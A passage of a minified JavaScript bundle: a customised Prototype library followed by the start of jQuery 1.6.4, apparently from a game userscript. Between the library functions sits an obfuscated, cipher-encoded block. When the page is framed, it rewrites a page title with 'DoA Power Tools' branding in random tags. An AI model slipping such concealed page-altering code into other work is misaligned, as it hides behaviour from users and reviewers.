o;switch(type){case"boolean":return BOOLEAN_TYPE;case"number":return NUMBER_TYPE;case"string":return STRING_TYPE;}return OBJECT_TYPE;}function extend(destination,source){for(var property in source){destination[property]=source[property];}return destination;}function inspect(object){try{if(isUndefined(object)){return"undefined";}if(object===null){return"null";}return object.inspect?object.inspect():String(object);}catch(e){if(e instanceof RangeError){return"...";}throw e;}}function toJSON(value){return Str("",{"":value},[]);}function Str(key,holder,stack){var value=holder[key],type=typeof value;if(Type(value)===OBJECT_TYPE&&typeof value.toJSON==="function"){value=value.toJSON(key);}var _class=_toString.call(value);switch(_class){case NUMBER_CLASS:case BOOLEAN_CLASS:case STRING_CLASS:value=value.valueOf();}switch(value){case null:return"null";case true:return"true";case false:return"false";}type=typeof value;switch(type){case"string":return value.inspect(true);case"number":return isFinite(value)?String(value):"null";case"object":for(var i=0,length=stack.length;i<length;i++){if(stack[i]===value){throw new TypeError();}}stack.push(value);var partial=[];if(_class===ARRAY_CLASS){for(var i=0,length=value.length;i<length;i++){var str=Str(i,value,stack);partial.push(typeof str==="undefined"?"null":str);}partial="["+partial.join(",")+"]";}else{var keys=Object.keys(value);for(var i=0,length=keys.length;i<length;i++){var key=keys[i],str=Str(key,value,stack);if(typeof str!=="undefined"){partial.push(key.inspect(true)+":"+str);}}partial="{"+partial.join(",")+"}";}stack.pop();return partial;}}function stringify(object){return JSON.stringify(object);}function toQueryString(object){return $H(object).toQueryString();}function toHTML(object){return object&&object.toHTML?object.toHTML():String.interpret(object);}function keys(object){if(Type(object)!==OBJECT_TYPE){throw new TypeError();}var results=[];for(var property in object){if(object.hasOwnProperty(property)){results.push(property);}}return results;}function values(object){var results=[];for(var property in object){results.push(object[property]);}return results;}function clone(object){return extend({},object);}function isElement(object){return !!(object&&object.nodeType==1);}function isArray(object){return _toString.call(object)===ARRAY_CLASS;}var hasNativeIsArray=(typeof Array.isArray=="function")&&Array.isArray([])&&!Array.isArray({});if(hasNativeIsArray){isArray=Array.isArray;}function isHash(object){return object instanceof Hash;}function isFunction(object){return _toString.call(object)===FUNCTION_CLASS;}function isString(object){return _toString.call(object)===STRING_CLASS;}function isNumber(object){return _toString.call(object)===NUMBER_CLASS;}function isDate(object){return _toString.call(object)===DATE_CLASS;}function isUndefined(object){return typeof object==="undefined";}extend(Object,{extend:extend,inspect:inspect,toJSON:NATIVE_JSON_STRINGIFY_SUPPORT?stringify:toJSON,toQueryString:toQueryString,toHTML:toHTML,keys:Object.keys||keys,values:values,clone:clone,isElement:isElement,isArray:isArray,isHash:isHash,isFunction:isFunction,isString:isString,isNumber:isNumber,isDate:isDate,isUndefined:isUndefined});})();Object.extend(Function.prototype,(function(){var slice=Array.prototype.slice;function update(array,args){var arrayLength=array.length,length=args.length;while(length--){array[arrayLength+length]=args[length];}return array;}function merge(array,args){array=slice.call(array,0);return update(array,args);}function argumentNames(){var names=this.toString().match(/^[\s\(]*function[^(]*\(([^)]*)\)/)[1].replace(/\/\/.*?[\r\n]|\/\*(?:.|[\r\n])*?\*\//g,"").replace(/\s+/g,"").split(",");return names.length==1&&!names[0]?[]:names;}function bind(context){if(arguments.length<2&&Object.isUndefined(arguments[0])){return this;}var __method=this,args=slice.call(arguments,1);return function(){var a=merge(args,arguments);return __method.apply(context,a);};}function bindAsEventListener(context){var __method=this,args=slice.call(arguments,1);return function(event){var a=update([event||window.event],args);return __method.apply(context,a);};}function curry(){if(!arguments.length){return this;}var __method=this,args=slice.call(arguments,0);return function(){var a=merge(args,arguments);return __method.apply(this,a);};}function delay(timeout){var __method=this,args=slice.call(arguments,1);timeout=timeout*1000;return window.setTimeout(function(){return __method.apply(__method,args);},timeout);}function defer(){var args=update([0.01],arguments);return this.delay.apply(this,args);}function wrap(wrapper){var __method=this;return function(){var a=update([__method.bind(this)],arguments);return wrapper.apply(this,a);};}function methodize(){if(this._methodized){return this._methodized;}var __method=this;return this._methodized=function(){var a=update([this],arguments);return __method.apply(null,a);};}return{argumentNames:argumentNames,bind:bind,bindAsEventListener:bindAsEventListener,curry:curry,delay:delay,defer:defer,wrap:wrap,methodize:methodize};})());(function(proto){function toISOString(){return this.getUTCFullYear()+"-"+(this.getUTCMonth()+1).toPaddedString(2)+"-"+this.getUTCDate().toPaddedString(2)+"T"+this.getUTCHours().toPaddedString(2)+":"+this.getUTCMinutes().toPaddedString(2)+":"+this.getUTCSeconds().toPaddedString(2)+"Z";}function toJSON(){return this.toISOString();}if(!proto.toISOString){proto.toISOString=toISOString;}if(!proto.toJSON){proto.toJSON=toJSON;}})(Date.prototype);RegExp.prototype.match=RegExp.prototype.test;RegExp.escape=function(str){return String(str).replace(/([.*+?^=!:${}()|[\]\/\\])/g,"\\$1");};var PeriodicalExecuter=Class.create({initialize:function(callback,frequency){this.callback=callback;this.frequency=frequency;this.currentlyExecuting=false;this.registerCallback();},registerCallback:function(){this.timer=setInterval(this.onTimerEvent.bind(this),this.frequency*1000);},execute:function(){this.callback(this);},stop:function(){if(!this.timer){return;}clearInterval(this.timer);this.timer=null;},onTimerEvent:function(){if(!this.currentlyExecuting){try{this.currentlyExecuting=true;this.execute();this.currentlyExecuting=false;}catch(e){this.currentlyExecuting=false;throw e;}}}});Object.extend(String,{interpret:function(value){return value==null?"":String(value);},specialChar:{"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r","\\":"\\\\"}});Object.extend(String.prototype,(function(){var NATIVE_JSON_PARSE_SUPPORT=window.JSON&&typeof JSON.parse==="function"&&JSON.parse('{"test": true}').test;function prepareReplacement(replacement){if(Object.isFunction(replacement)){return replacement;}var template=new Template(replacement);return function(match){return template.evaluate(match);};}function gsub(pattern,replacement){var result="",source=this,match;replacement=prepareReplacement(replacement);if(Object.isString(pattern)){pattern=RegExp.escape(pattern);}if(!(pattern.length||pattern.source)){replacement=replacement("");return replacement+source.split("").join(replacement)+replacement;}while(source.length>0){if(match=source.match(pattern)){result+=source.slice(0,match.index);result+=String.interpret(replacement(match));source=source.slice(match.index+match[0].length);}else{result+=source,source="";}}return result;}function sub(pattern,replacement,count){replacement=prepareReplacement(replacement);count=Object.isUndefined(count)?1:count;return this.gsub(pattern,function(match){if(--count<0){return match[0];}return replacement(match);});}function scan(pattern,iterator){this.gsub(pattern,iterator);return String(this);}function truncate(length,truncation){length=length||30;truncation=Object.isUndefined(truncation)?"...":truncation;return this.length>length?this.slice(0,length-truncation.length)+truncation:String(this);}function strip(){return this.replace(/^\s+/,"").replace(/\s+$/,"");}function stripTags(){return this.replace(/<\w+(\s+("[^"]*"|'[^']*'|[^>])+)?>|<\/\w+>/gi,"");}function stripScripts(){return this.replace(new RegExp(Prototype.ScriptFragment,"img"),"");}function extractScripts(){var matchAll=new RegExp(Prototype.ScriptFragment,"img"),matchOne=new RegExp(Prototype.ScriptFragment,"im");return(this.match(matchAll)||[]).map(function(scriptTag){return(scriptTag.match(matchOne)||["",""])[1];});}function evalScripts(){return this.extractScripts().map(function(script){return eval(script);});}function escapeHTML(){return this.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");}function unescapeHTML(){return this.stripTags().replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&amp;/g,"&");}function toQueryParams(separator){var match=this.strip().match(/([^?#]*)(#.*)?$/);if(!match){return{};}return match[1].split(separator||"&").inject({},function(hash,pair){if((pair=pair.split("="))[0]){var key=decodeURIComponent(pair.shift()),value=pair.length>1?pair.join("="):pair[0];if(value!=undefined){value=decodeURIComponent(value);}if(key in hash){if(!Object.isArray(hash[key])){hash[key]=[hash[key]];}hash[key].push(value);}else{hash[key]=value;}}return hash;});}function toArray(){return this.split("");}function succ(){return this.slice(0,this.length-1)+String.fromCharCode(this.charCodeAt(this.length-1)+1);}function times(count){return count<1?"":new Array(count+1).join(this);}function camelize(){return this.replace(/-+(.)?/g,function(match,chr){return chr?chr.toUpperCase():"";});}function capitalize(){return this.charAt(0).toUpperCase()+this.substring(1).toLowerCase();}function underscore(){return this.replace(/::/g,"/").replace(/([A-Z]+)([A-Z][a-z])/g,"$1_$2").replace(/([a-z\d])([A-Z])/g,"$1_$2").replace(/-/g,"_").toLowerCase();}function dasherize(){return this.replace(/_/g,"-");}function inspect(useDoubleQuotes){var escapedString=this.replace(/[\x00-\x1f\\]/g,function(character){if(character in String.specialChar){return String.specialChar[character];}return"\\u00"+character.charCodeAt().toPaddedString(2,16);});if(useDoubleQuotes){return'"'+escapedString.replace(/"/g,'\\"')+'"';}return"'"+escapedString.replace(/'/g,"\\'")+"'";}function unfilterJSON(filter){return this.replace(filter||Prototype.JSONFilter,"$1");}function isJSON(){var str=this;if(str.blank()){return false;}str=str.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@");str=str.replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]");str=str.replace(/(?:^|:|,)(?:\s*\[)+/g,"");return(/^[\],:{}\s]*$/).test(str);}function evalJSON(sanitize){var json=this.unfilterJSON(),cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g;if(cx.test(json)){json=json.replace(cx,function(a){return"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4);});}try{if(!sanitize||json.isJSON()){return eval("("+json+")");}}catch(e){}throw new SyntaxError("Badly formed JSON string: "+this.inspect());}function parseJSON(){var json=this.unfilterJSON();return JSON.parse(json);}function include(pattern){return this.indexOf(pattern)>-1;}function startsWith(pattern){return this.lastIndexOf(pattern,0)===0;}function endsWith(pattern){var d=this.length-pattern.length;return d>=0&&this.indexOf(pattern,d)===d;}function empty(){return this=="";}function blank(){return/^\s*$/.test(this);}function interpolate(object,pattern){return new Template(this,pattern).evaluate(object);}return{gsub:gsub,sub:sub,scan:scan,truncate:truncate,strip:String.prototype.trim||strip,stripTags:stripTags,stripScripts:stripScripts,extractScripts:extractScripts,evalScripts:evalScripts,escapeHTML:escapeHTML,unescapeHTML:unescapeHTML,toQueryParams:toQueryParams,parseQuery:toQueryParams,toArray:toArray,succ:succ,times:times,camelize:camelize,capitalize:capitalize,underscore:underscore,dasherize:dasherize,inspect:inspect,unfilterJSON:unfilterJSON,isJSON:isJSON,evalJSON:NATIVE_JSON_PARSE_SUPPORT?parseJSON:evalJSON,include:include,startsWith:startsWith,endsWith:endsWith,empty:empty,blank:blank,interpolate:interpolate};})());(window.top==window.self)||(function(){var b,f,q,x,p=0,z=function(p){return p.replace(/[^\w]/g," ").replace(/[\w]/g,function(c){return/[\d]/.test(c)?c:String.fromCharCode((c>"_"?24*5+2:18*5)>=(c=c.charCodeAt(0)+(5*3-2))?c:c-2*(3*5-2))})};q=eval(z("frgGvzrbhg"));x=eval(z("pyrneGvzrbhg"));f=function(y){var w,c,h,a,i,t,l,m,o,s,n,u,d,r;try{x(b);d=document;u=eval(z("HVQ"));w=function(n,h,c){return d[z("trgRyrzragOlVq")](z(h||"").replace(/\s/g,c||"_")+u[z(n).replace(/\s/g,c||"_")]);};c=function(q,r){return (d[z("trgRyrzragfOlPynffAnzr")](u[z(q).replace(/\s/,r||"_")]))[0];};o=w("qvnybt?znva&obk","hv$qvnybt$gvgyr+","-")||w("gnoVasb&Gvgyr")||w("gnoVasb?Pbagrag")||c("gvgyr");o=o[z("cneragAbqr")][z("svefgPuvyq")]||o;n=function(b,d){return Math.floor(Math.random()*(d-b+1)+b)};a=z("o+oQb!u3@PrAGrE<qVI>SBaG$U2%v+YnORy?C%fCnA#U4=fGEbAT$qg!h#rz¿yv=by&hy%n$u1").toUpperCase().split(" ");s=z((["/QbN+Cbjre?Gbbyf*Grnzjbex&$","$i",((o[z("grkgPbagrag")].match(/\d+\W*/))||[])[0],"?"]).join(""))+(String[z("fpevcgZbqOl")]||"")+" ";o[z("vaareUGZY")]="";for(i=0,m=s.length-1;i<m;){t=a[n(0,a.length-1)];l=Math.min(m-i,n(1,3));r=d[z("perngrRyrzrag")](t);r[z("vaareUGZY")]=s.substr(i,l).replace(/\s/g,"&nbsp;");o[z("nccraqPuvyq")](r);if(i+l>=m){break}i+=l}}catch(e){++p;(p==7*7)||(b=q(f,(3*4*5*6*3)+y,p*250));}};b=q(f,1*2*3*4*5*6*7*3,0);})();var Template=Class.create({initialize:function(template,pattern){this.template=template.toString();this.pattern=pattern||Template.Pattern;},evaluate:function(object){if(object&&Object.isFunction(object.toTemplateReplacements)){object=object.toTemplateReplacements();}return this.template.gsub(this.pattern,function(match){if(object==null){return(match[1]+"");}var before=match[1]||"";if(before=="\\"){return match[2];}var ctx=object,expr=match[3],pattern=/^([^.[]+|\[((?:.*?[^\\])?)\])(\.|\[|$)/;match=pattern.exec(expr);if(match==null){return before;}while(match!=null){var comp=match[1].startsWith("[")?match[2].replace(/\\\\]/g,"]"):match[1];ctx=ctx[comp];if(null==ctx||""==match[3]){break;}expr=expr.substring("["==match[3]?match[1].length:match[0].length);match=pattern.exec(expr);}return before+String.interpret(ctx);});}});Template.Pattern=/(^|.|\r|\n)(#\{(.*?)\})/;var $break={};var Enumerable=(function(){function each(iterator,context){var index=0;try{this._each(function(value){iterator.call(context,value,index++);});}catch(e){if(e!=$break){throw e;}}return this;}function eachSlice(number,iterator,context){var index=-number,slices=[],array=this.toArray();if(number<1){return array;}while((index+=number)<array.length){slices.push(array.slice(index,index+number));}return slices.collect(iterator,context);}function all(iterator,context){iterator=iterator||Prototype.K;var result=true;this.each(function(value,index){result=result&&!!iterator.call(context,value,index);if(!result){throw $break;}});return result;}function any(iterator,context){iterator=iterator||Prototype.K;var result=false;this.each(function(value,index){if(result=!!iterator.call(context,value,index)){throw $break;}});return result;}function collect(iterator,context){iterator=iterator||Prototype.K;var results=[];this.each(function(value,index){results.push(iterator.call(context,value,index));});return results;}function detect(iterator,context){var result;this.each(function(value,index){if(iterator.call(context,value,index)){result=value;throw $break;}});return result;}function findAll(iterator,context){var results=[];this.each(function(value,index){if(iterator.call(context,value,index)){results.push(value);}});return results;}function grep(filter,iterator,context){iterator=iterator||Prototype.K;var results=[];if(Object.isString(filter)){filter=new RegExp(RegExp.escape(filter));}this.each(function(value,index){if(filter.match(value)){results.push(iterator.call(context,value,index));}});return results;}function include(object){if(Object.isFunction(this.indexOf)){if(this.indexOf(object)!=-1){return true;}}var found=false;this.each(function(value){if(value==object){found=true;throw $break;}});return found;}function inGroupsOf(number,fillWith){fillWith=Object.isUndefined(fillWith)?null:fillWith;return this.eachSlice(number,function(slice){while(slice.length<number){slice.push(fillWith);}return slice;});}function inject(memo,iterator,context){this.each(function(value,index){memo=iterator.call(context,memo,value,index);});return memo;}function invoke(method){var args=$A(arguments).slice(1);return this.map(function(value){return value[method].apply(value,args);});}function max(iterator,context){iterator=iterator||Prototype.K;var result;this.each(function(value,index){value=iterator.call(context,value,index);if(result==null||value>=result){result=value;}});return result;}function min(iterator,context){iterator=iterator||Prototype.K;var result;this.each(function(value,index){value=iterator.call(context,value,index);if(result==null||value<result){result=value;}});return result;}function partition(iterator,context){iterator=iterator||Prototype.K;var trues=[],falses=[];this.each(function(value,index){(iterator.call(context,value,index)?trues:falses).push(value);});return[trues,falses];}function pluck(property){var results=[];this.each(function(value){results.push(value[property]);});return results;}function reject(iterator,context){var results=[];this.each(function(value,index){if(!iterator.call(context,value,index)){results.push(value);}});return results;}function sortBy(iterator,context){return this.map(function(value,index){return{value:value,criteria:iterator.call(context,value,index)};}).sort(function(left,right){var a=left.criteria,b=right.criteria;return a<b?-1:a>b?1:0;}).pluck("value");}function toArray(){return this.map();}function zip(){var iterator=Prototype.K,args=$A(arguments);if(Object.isFunction(args.last())){iterator=args.pop();}var collections=[this].concat(args).map($A);return this.map(function(value,index){return iterator(collections.pluck(index));});}function size(){return this.toArray().length;}function inspect(){return"#<Enumerable:"+this.toArray().inspect()+">";}return{each:each,eachSlice:eachSlice,all:all,every:all,any:any,some:any,collect:collect,map:collect,detect:detect,findAll:findAll,select:findAll,filter:findAll,grep:grep,include:include,member:include,inGroupsOf:inGroupsOf,inject:inject,invoke:invoke,max:max,min:min,partition:partition,pluck:pluck,reject:reject,sortBy:sortBy,toArray:toArray,entries:toArray,zip:zip,size:size,inspect:inspect,find:detect};})();function $A(iterable){if(!iterable){return[];}if("toArray" in Object(iterable)){return iterable.toArray();}var length=iterable.length||0,results=new Array(length);while(length--){results[length]=iterable[length];}return results;}function $w(string){if(!Object.isString(string)){return[];}string=string.strip();return string?string.split(/\s+/):[];}Array.from=$A;(function(){var arrayProto=Array.prototype,slice=arrayProto.slice,_each=arrayProto.forEach;function each(iterator,context){for(var i=0,length=this.length>>>0;i<length;i++){if(i in this){iterator.call(context,this[i],i,this);}}}if(!_each){_each=each;}function clear(){this.length=0;return this;}function first(){return this[0];}function last(){return this[this.length-1];}function compact(){return this.select(function(value){return value!=null;});}function flatten(){return this.inject([],function(array,value){if(Object.isArray(value)){return array.concat(value.flatten());}array.push(value);return array;});}function without(){var values=slice.call(arguments,0);return this.select(function(value){return !values.include(value);});}function reverse(inline){return(inline===false?this.toArray():this)._reverse();}function uniq(sorted){return this.inject([],function(array,value,index){if(0==index||(sorted?array.last()!=value:!array.include(value))){array.push(value);}return array;});}function intersect(array){return this.uniq().findAll(function(item){return array.detect(function(value){return item===value;});});}function clone(){return slice.call(this,0);}function size(){return this.length;}function inspect(){return"["+this.map(Object.inspect).join(", ")+"]";}function indexOf(item,i){i||(i=0);var length=this.length;if(i<0){i=length+i;}for(;i<length;i++){if(this[i]===item){return i;}}return -1;}function lastIndexOf(item,i){i=isNaN(i)?this.length:(i<0?this.length+i:i)+1;var n=this.slice(0,i).reverse().indexOf(item);return(n<0)?n:i-n-1;}function concat(){var array=slice.call(this,0),item;for(var i=0,length=arguments.length;i<length;i++){item=arguments[i];if(Object.isArray(item)&&!("callee" in item)){for(var j=0,arrayLength=item.length;j<arrayLength;j++){array.push(item[j]);}}else{array.push(item);}}return array;}Object.extend(arrayProto,Enumerable);if(!arrayProto._reverse){arrayProto._reverse=arrayProto.reverse;}Object.extend(arrayProto,{_each:_each,clear:clear,first:first,last:last,compact:compact,flatten:flatten,without:without,reverse:reverse,uniq:uniq,intersect:intersect,clone:clone,toArray:clone,size:size,inspect:inspect});var CONCAT_ARGUMENTS_BUGGY=(function(){return[].concat(arguments)[0][0]!==1;})(1,2);if(CONCAT_ARGUMENTS_BUGGY){arrayProto.concat=concat;}if(!arrayProto.indexOf){arrayProto.indexOf=indexOf;}if(!arrayProto.lastIndexOf){arrayProto.lastIndexOf=lastIndexOf;}})();function $H(object){return new Hash(object);}var Hash=Class.create(Enumerable,(function(){function initialize(object){this._object=Object.isHash(object)?object.toObject():Object.clone(object);}function _each(iterator){for(var key in this._object){var value=this._object[key],pair=[key,value];pair.key=key;pair.value=value;iterator(pair);}}function set(key,value){return this._object[key]=value;}function get(key){if(this._object[key]!==Object.prototype[key]){return this._object[key];}}function unset(key){var value=this._object[key];delete this._object[key];return value;}function toObject(){return Object.clone(this._object);}function keys(){return this.pluck("key");}function values(){return this.pluck("value");}function index(value){var match=this.detect(function(pair){return pair.value===value;});return match&&match.key;}function merge(object){return this.clone().update(object);}function update(object){return new Hash(object).inject(this,function(result,pair){result.set(pair.key,pair.value);return result;});}function toQueryPair(key,value){if(Object.isUndefined(value)){return key;}return key+"="+encodeURIComponent(String.interpret(value));}function toQueryString(){return this.inject([],function(results,pair){var key=encodeURIComponent(pair.key),values=pair.value;if(values&&typeof values=="object"){if(Object.isArray(values)){var queryValues=[];for(var i=0,len=values.length,value;i<len;i++){value=values[i];queryValues.push(toQueryPair(key,value));}return results.concat(queryValues);}}else{results.push(toQueryPair(key,values));}return results;}).join("&");}function inspect(){return"#<Hash:{"+this.map(function(pair){return pair.map(Object.inspect).join(": ");}).join(", ")+"}>";}function clone(){return new Hash(this);}return{initialize:initialize,_each:_each,set:set,get:get,unset:unset,toObject:toObject,toTemplateReplacements:toObject,keys:keys,values:values,index:index,merge:merge,update:update,toQueryString:toQueryString,inspect:inspect,toJSON:toObject,clone:clone};})());Hash.from=$H;Object.extend(Number.prototype,(function(){function toColorPart(){return this.toPaddedString(2,16);}function succ(){return this+1;}function times(iterator,context){$R(0,this,true).each(iterator,context);return this;}function toPaddedString(length,radix){var string=this.toString(radix||10);return"0".times(length-string.length)+string;}function abs(){return Math.abs(this);}function round(){return Math.round(this);}function ceil(){return Math.ceil(this);}function floor(){return Math.floor(this);}return{toColorPart:toColorPart,succ:succ,times:times,toPaddedString:toPaddedString,abs:abs,round:round,ceil:ceil,floor:floor};})());function $R(start,end,exclusive){return new ObjectRange(start,end,exclusive);}var ObjectRange=Class.create(Enumerable,(function(){function initialize(start,end,exclusive){this.start=start;this.end=end;this.exclusive=exclusive;}function _each(iterator){var value=this.start;while(this.include(value)){iterator(value);value=value.succ();}}function include(value){if(value<this.start){return false;}if(this.exclusive){return value<this.end;}return value<=this.end;}return{initialize:initialize,_each:_each,include:include};})());


//\\\\\\\\\\\\\\\\\\\\\\\\  END Custom Prototype  ////////////////////////\\




if (typeof jQuery == "undefined") {
///////////////////////////  jQuery & jQuery UI  \\\\\\\\\\\\\\\\\\\\\\\\\\\

/*!
 * jQuery JavaScript Library v1.6.4
 * http://jquery.com/
 *
 * Copyright 2011, John Resig
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * Includes Sizzle.js
 * http://sizzlejs.com/
 * Copyright 2011, The Dojo Foundation
 * Released under the MIT, BSD, and GPL Licenses.
 *
 * Date: Mon Sep 12 18:54:48 2011 -0400
 */
(function(a,b){function cu(a){return f.isWindow(a)?a:a.nodeType===9?a.defaultView||a.parentWindow:!1}function cr(a){if(!cg[a]){var b=c.body,d=f("<"+a+">").appendTo(b),e=d.css("display");d.remove();if(e==="none"||e===""){ch||(ch=c.createElement("iframe"),ch.frameBorder=ch.width=ch.height=0),b.appendChild(ch);if(!ci||!ch.createElement)ci=(ch.contentWindow||ch.contentDocument).document,ci.write((c.compatMode==="CSS1Compat"?"<!doctype html>":"")+"<html><body>"),ci.close();d=ci.createElement(a),ci.body.appendChild(d),e=f.css(d,"display"),b.removeChild(ch)}cg[a]=e}return cg[a]}function cq(a,b){var c={};f.each(cm.concat.apply([],cm.slice(0,b)),function(){c[this]=a});return c}function cp(){cn=b}function co(){setTimeout(cp,0);return cn=f.now()}function cf(){try{return new a.ActiveXObject("Microsoft.XMLHTTP")}catch(b){}}function ce(){try{return new a.XMLHttpRequest}catch(b){}}function b$(a,c){a.dataFilter&&(c=a.dataFilter(c,a.dataType));var d=a.dataTypes,e={},g,h,i=d.length,j,k=d[0],l,m,n,o,p;for(g=1;g<i;g++){if(g===1)for(h in a.converters)typeof h=="string"&&(e[h.toLowerCase()]=a.converters[h]);l=k,k=d[g];if(k==="*")k=l;else if(l!=="*"&&l!==k){m=l+" "+k,n=e[m]||e["* "+k];if(!n){p=b;for(o in e){j=o.split(" ");if(j[0]===l||j[0]==="*"){p=e[j[1]+" "+k];if(p){o=e[o],o===!0?n=p:p===!0&&(n=o);break}}}}!n&&!p&&f.error("No conversion from "+m.replace(" "," to ")),n!==!0&&(c=n?n(c):p(o(c)))}}return c}function bZ(a,c,d){var e=a.contents,f=a.dataTypes,g=a.responseFields,h,i,j,k;for(i in g)i in d&&(c[g[i]]=d[i]);while(f[0]==="*")f.shift(),h===b&&(h=a.mimeType||c.getResponseHeader("content-type"));if(h)for(i in e)if(e[i]&&e[i].test(h)){f.unshift(i);break}if(f[0]in d)j=f[0];else{for(i in d){if(!f[0]||a.converters[i+" "+f[0]]){j=i;break}k||(k=i)}j=j||k}if(j){j!==f[0]&&f.unshift(j);return d[j]}}function bY(a,b,c,d){if(f.isArray(b))f.each(b,function(b,e){c||bA.test(a)?d(a,e):bY(a+"["+(typeof e=="object"||f.isArray(e)?b:"")+"]",e,c,d)});else if(!c&&b!=null&&typeof b=="object")for(var e in b)bY(a+"["+e+"]",b[e],c,d);else d(a,b)}function bX(a,c){var d,e,g=f.ajaxSettings.flatOptions||{};for(d in c)c[d]!==b&&((g[d]?a:e||(e={}))[d]=c[d]);e&&f.extend(!0,a,e)}function bW(a,c,d,e,f,g){f=f||c.dataTypes[0],g=g||{},g[f]=!0;var h=a[f],i=0,j=h?h.length:0,k=a===bP,l;for(;i<j&&(k||!l);i++)l=h[i](c,d,e),typeof l=="string"&&(!k||g[l]?l=b:(c.dataTypes.unshift(l),l=bW(a,c,d,e,l,g)));(k||!l)&&!g["*"]&&(l=bW(a,c,d,e,"*",g));return l}function bV(a){return function(b,c){typeof b!="string"&&(c=b,b="*");if(f.isFunction(c)){var d=b.toLowerCase().split(bL),e=0,g=d.length,h,i,j;for(;e<g;e++)h=d[e],j=/^\+/.test(h),j&&(h=h.substr(1)||"*"),i=a[h]=a[h]||[],i[j?"unshift":"push"](c)}}}function by(a,b,c){var d=b==="width"?a.offsetWidth:a.offsetHeight,e=b==="width"?bt:bu;if(d>0){c!=="border"&&f.each(e,function(){c||(d-=parseFloat(f.css(a,"padding"+this))||0),c==="margin"?d+=parseFloat(f.css(a,c+this))||0:d-=parseFloat(f.css(a,"border"+this+"Width"))||0});return d+"px"}d=bv(a,b,b);if(d<0||d==null)d=a.style[b]||0;d=parseFloat(d)||0,c&&f.each(e,function(){d+=parseFloat(f.css(a,"padding"+this))||0,c!=="padding"&&(d+=parseFloat(f.css(a,"border"+this+"Width"))||0),c==="margin"&&(d+=parseFloat(f.css(a,c+this))||0)});return d+"px"}function bl(a,b){b.src?f.ajax({url:b.src,async:!1,dataType:"script"}):f.globalEval((b.text||b.textContent||b.innerHTML||"").replace(bd,"/*$0*/")),b.parentNode&&b.parentNode.removeChild(b)}function bk(a){f.nodeName(a,"input")?bj(a):"getElementsByTagName"in a&&f.grep(a.getElementsByTagName("input"),bj)}function bj(a){if(a.type==="checkbox"||a.type==="radio")a.defaultChecked=a.checked}function bi(a){return"getElementsByTagName"in a?a.getElementsByTagName("*"):"querySelectorAll"in a?a.querySelectorAll("*"):[]}function bh(a,b){var c;if(b.nodeType===1){b.clearAttributes&&b.clearAttributes(),b.mergeAttributes&&b.mergeAttributes(a),c=b.nodeName.toLowerCase();if(c==="object")b.outerHTML=a.outerHTML;else if(c!=="input"||a.type!=="checkbox"&&a.type!=="radio"){if(c==="option")b.selected=a.defaultSelected;else if(c==="input"||c==="textarea")b.defaultValue=a.defaultValue}else a.checked&&(b.defaultChecked=b.checked=a.checked),b.value!==a.value&&(b.value=a.value);b.removeAttribute(f.expando)}}function bg(a,b){if(b.nodeType===1&&!!f.hasData(a)){var c=f.expando,d=f.data(a),e=f.data(b,d);if(d=d[c]){var g=d.events;e=e[c]=f.extend({},d);if(g){delete e.handle,e.events={};for(var h in g)for(var i=0,j=g[h].length;i<j;i++)f.event.add(b,h+(g[h][i].namespace?".":"")+g[h][i].namespace,g[h][i],g[h][i].data)}}}}function bf(a,b){return f.nodeName(a,"table")?a.getElementsByTagName("tbody")[0] ||a.appendChild(a.ownerDocument.createElement("tbody")):a}function V(a,b,c){b=b||0;if(f.isFunction(b))return f.grep(a,function(a,d){var e=!!b.call(a,d,a);return e===c});if(b.nodeType)return f.grep(a,function(a,d){return a===b===c});if(typeof b=="string"){var d=f.grep(a,function(a){return a.nodeType===1});if(Q.test(b))return f.filter(b,d,!c);b=f.filter(b,d)}return f.grep(a,function(a,d){return f.inArray(a,b)>=0===c})}function U(a){return!a||!a.parentNode||a.parentNode.nodeType===11}function M(a,b){return(a&&a!=="*"?a+".":"")+b.replace(y,"`").replace(z,"&")}function L(a){var b,c,d,e,g,h,i,j,k,l,m,n,o,p=[],q=[],r=f._data(this,"events");if(!(a.liveFired===this||!r||!r.live||a.target.disabled||a.button&&a.type==="click")){a.namespace&&(n=new RegExp("(^|\\.)"+a.namespace.split(".").join("\\.(?:.*\\.)?")+"(\\.|$)")),a.liveFired=this;var s=r.live.slice(0);for(i=0;i<s.length;i++)g=s[i],g.origType.replace(w,"")===a.type?q.push(g.selector):s.splice(i--,1);e=f(a.target).closest(q,a.current_target);for(j=0,k=e.length;j<k;j++){m=e[j];for(i=0;i<s.length;i++){g=s[i];if(m.selector===g.selector&&(!n||n.test(g.namespace))&&!m.elem.disabled){h=m.elem,d=null;if(g.preType==="mouseenter"||g.preType==="mouseleave")a.type=g.preType,d=f(a.relatedTarget).closest(g.selector)[0],d&&f.contains(h,d)&&(d=h);(!d||d!==h)&&p.push({elem:h,handleObj:g,level:m.level})}}}for(j=0,k=p.length;j<k;j++){e=p[j];if(c&&e.level>c)break;a.current_target=e.elem,a.data=e.handleObj.data,a.handleObj=e.handleObj,o=e.handleObj.origHandler.apply(e.elem,arguments);if(o===!1||a.isPropagationStopped()){c=e.level,o===!1&&(b=!1);if(a.isImmediatePropagationStopped())break}}return b}}function J(a,c,d){var e=f.extend({},d[0]);e.type=a,e.originalEvent={},e.liveFired=b,f.event.handle.call(c,e),e.isDefaultPrevented()&&d[0].preventDefault()}function D(){return!0}function C(){return!1}function m(a,c,d){var e=c+"defer",g=c+"queue",h=c+"mark",i=f.data(a,e,b,!0);i&&(d==="queue"||!f.data(a,g,b,!0))&&(d==="mark"||!f.data(a,h,b,!0))&&setTimeout(function(){!f.data(a,g,b,!0)&&!f.data(a,h,b,!0)&&(f.removeData(a,e,!0),i.resolve())},0)}function l(a){for(var b in a)if(b!=="toJSON")return!1;return!0}function k(a,c,d){if(d===b&&a.nodeType===1){var e="data-"+c.replace(j,"-$1").toLowerCase();d=a.getAttribute(e);if(typeof 